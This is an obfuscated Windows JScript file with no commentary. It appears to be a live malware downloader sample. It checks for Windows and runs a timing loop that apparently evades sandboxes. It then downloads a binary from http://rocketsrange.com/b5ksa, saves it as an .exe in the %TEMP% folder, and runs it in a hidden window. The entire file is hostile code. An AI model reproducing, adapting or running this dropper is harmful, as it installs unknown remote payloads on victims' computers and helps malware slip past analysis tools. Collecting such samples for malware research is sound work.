var _S = false;
var _WR = "CreateObject";
var _E = function _D0() {return WScript[_WR]("WScript"+".Shell");}(), _ZC = 11;
var _Z0 = "MSXML2.XMLHTTP";
var _I = 2123213;
var _C = 0;
function _DD(_GY){_E["Run"](_GY, _C, _C);};
function _H(){return _Z0 + "";};
function _Z(_N, _O0){_C = _C * 1; return _N - _O0;};
function _OO(){return _WR;};
/*@cc_on
  @if (@_win32 || @_win64)
    _S = true;
  @end
@*/
if (_S)
{
var _PH = "";
function _RQ(){return 22;};
var _LS = 0; var _Y = 0;
function _GC()
{
var _UQ = new this["Date"]();
var _BA = _UQ["getUTCMilliseconds"]();
WScript["Sleep"](_RQ());
var _UQ = new this["Date"]();
var _G = _UQ["getUTCMilliseconds"]();
WScript["Sleep"](_RQ());
var _UQ = new this["Date"]();
var _XN = _UQ["getUTCMilliseconds"]();
var _LS = "_J";
_LS = _Z(_G, _BA);
var _Y = "_VG";
_Y = _Z(_XN, _G);
_PH = "open";
return _Z(_LS, _Y);
}
var _DN = false;
var _A = false;
for (var _YF = _C; _YF < _RQ() * 1; _YF++){if (_GC() != _C){
_DN = true; 
_Y = "31" + 11 * _LS + _Y; 
_A = true; 
break;
}}
function _O() {return ((_DN == true) && (_DN == _A)) ? 1 : _C;};
if (_DN && _O() && _A){
function _GG() {return _E["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "5J0OIXQ1Z.ex" + "e";};
 _UA = _H();
 _IQ = WScript[_WR](_UA);
 var _V = 1;
 while (_V){
try {
	if (_V == 1)
	{
		_IQ[_PH]("GET", "http://rocketsrange.com/b5ksa", false);
		_IQ["send"]();
		_LG = "Sleep";
	}
	WScript[_LG](_RQ() + 120); 
	if (_IQ["readystate"] < 2 * 2) continue;
	_V = _C;
	function _D(_U) {var _HY = (1, 2, 3, 4, 5, _U); return _HY;};
	_ZP = WScript[_OO()]("ADODB.Stream");
	_UA = _ZP;
	_UA[_PH]();
	_UA["type"] = _D(1);
	_UA["write"](_IQ["ResponseBody"]);
	_ZP["position"] = _D(_C);
	_UA["Save" + "ToFile"](_GG(), 2);
	_ZP["cl"+"ose"]();
	_B = _GG();
	_DD(_B);
} catch(_C0){};
}
}
}

